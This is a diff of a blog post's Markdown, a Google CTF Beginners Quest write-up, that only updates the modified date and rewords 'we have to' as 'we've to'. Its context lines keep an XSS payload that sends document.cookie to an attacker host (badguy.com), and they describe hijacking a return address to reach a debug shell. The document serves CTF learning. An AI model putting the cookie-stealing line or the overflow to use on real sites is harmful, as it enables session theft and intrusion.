@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-07-31 18:49:05 +0000
-last_modified_at: 2018-08-01 10:02:48 +0000
+last_modified_at: 2018-08-03 17:43:14 +0000
 title: "Google CTF: Beginners Quest (Part 2)"
 category: CTF
 tags: [Google]
@@ -84,7 +84,7 @@ There's an interesting function `debug_shell` that wraps around the `system` lib
 
 Awesome. The offset controls the return address, which in turn allows us to return to `debug_shell` at `0x41414227` to execute `/bin/sh`. Sounds like a plan.
 
-For the exploit to work, we have to supply printable ASCII characters onto the limited shell—the return address `0x41414227` is `'BAA` in little-endian ASCII.
+For the exploit to work, we've to supply printable ASCII characters onto the limited shell—the return address `0x41414227` is `'BAA` in little-endian ASCII.
 
 ![shell](/assets/images/posts/google-ctf-beginners-quest-part-2/09550697.png)
 
@@ -128,7 +128,7 @@ The file `bad.js` can be simple as this to steal the session cookies registered 
 document.location = 'http://www.badguy.com/flag.png?' + document.cookie;
 ```
 
-Next up, we have to figure out the link to send to Wintermuted such that clicking the link has the same effect as POSTing the username and password as seen above to `https://router-ui.web.ctfcompetition.com/login` and triggering the bad JS, without any user interaction.
+Next up, we've to figure out the link to send to Wintermuted such that clicking the link has the same effect as POSTing the username and password as seen above to `https://router-ui.web.ctfcompetition.com/login` and triggering the bad JS, without any user interaction.
 
 This is how it looks like.
 
@@ -332,7 +332,7 @@ Archive:  motd.zip
     33784                     1 file
 ```
 
-I'm guessing `motd` is the binary running behind `motd.ctfcompetition.com`, and we have to exploit it to `pwn` this challenge.
+I'm guessing `motd` is the binary running behind `motd.ctfcompetition.com`, and we've to exploit it to `pwn` this challenge.
 
 ![motd](/assets/images/posts/google-ctf-beginners-quest-part-2/4761425f.png)
 
